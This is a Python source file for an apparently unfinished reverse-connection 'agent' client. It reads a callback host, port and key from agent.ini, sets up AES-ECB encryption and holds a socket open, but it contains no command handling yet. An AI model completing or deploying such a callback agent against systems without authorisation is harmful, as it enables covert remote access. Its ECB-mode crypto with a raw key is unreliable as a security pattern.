#!/usr/bin/env python3
from commons.helpers import SocketBuilder
from socket import socket, timeout, error, gethostbyname
from Crypto.Util.Padding import pad
from Crypto.Cipher import AES
from base64 import b64decode, b64encode
from commons.helpers import Config


class Client(object):

    __sock: socket = None
    __address: tuple = ()
    __client_up = False

    __secret = None
    __cipher = None

    EncodeAES = lambda c, s: b64encode(c.encrypt(pad(s, AES.block_size)))
    DecodeAES = lambda c, e: c.decrypt(b64decode(e)).decode()

    def __init__(self):
        if not self.__read_ini__():
            self.__read_ini__()
        if self.__secret:
            self.__cipher = AES.new(self.__secret, AES.MODE_ECB)
        self.__client_up = self.__create_connection__()

    def __read_ini__(self):
        try:
            url, port, secret = None, None, None
            with open(f'{Config.dist()}/agent.ini', 'r') as ini:
                lines = ini.readlines()
                for line in lines:
                    if 'ReverseUrl=' in line:
                        url = line.split("=").pop().replace("\n", "")
                    if 'ReversePort=' in line:
                        port = int(line.split("=").pop().replace("\n", ""))
                    if 'ReverseKey=' in line:
                        secret = line.split("=").pop().replace("\n", "")
            self.__address = (gethostbyname(url), int(port))
            self.__secret = bytes(secret, 'utf-8')
            return True
        except:
            return False

    def __create_connection__(self):
        try:
            self.__sock = SocketBuilder\
                .of_kind(SocketBuilder.INTERFACE)\
                .point_to(self.__address)\
                .build()
            print('[*] Socket was created and ready...')
            return True
        except error:
            return False

    def __receive_agent_id__(self):
        ...

    def start(self):
        if not self.__sock:
            if self.__create_connection__():
                self.__client_up = True
            else:
                raise Exception("Error while staring up the client service")
        print('[@] Connected via tunnel ~> %s:%s' % self.__address, hex(id(self.__sock)))
        while self.__client_up:
            try:
                self.__sock.sendall(b'')
            except error:
                continue


if __name__ == "__main__":
    c = Client()
    c.start()
